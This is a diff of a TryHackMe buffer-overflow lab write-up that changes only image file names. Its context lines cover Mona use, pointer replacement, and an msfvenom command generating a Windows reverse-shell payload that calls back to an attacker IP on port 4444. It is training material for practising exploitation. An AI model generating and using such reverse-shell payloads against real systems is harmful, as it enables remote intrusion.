@@ -44,7 +44,7 @@ description: https://tryhackme.com/room/bufferoverflowprep (oscp.exe)
 * We notice that it is running on port 1337
 * So, why not connect to it from Kali on port 1337?
 
-<figure><img src="../.gitbook/assets/image (8) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Mona Configuration
 
@@ -333,7 +333,7 @@ With the program running in a crashed or running state, run the following Mona c
 * Place the pointer address next to the retn value and comment it out if you want to
 * We will be replacing the retn value with the pointer value in little endian formatting which is backwards of the actual pointer address as you can see
 
-<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Lastly, remove the payload and replace with ""
 
@@ -371,7 +371,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 
 
 
-<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Copy the shell code only
 * Open <mark style="color:yellow;">01exploit.py</mark>
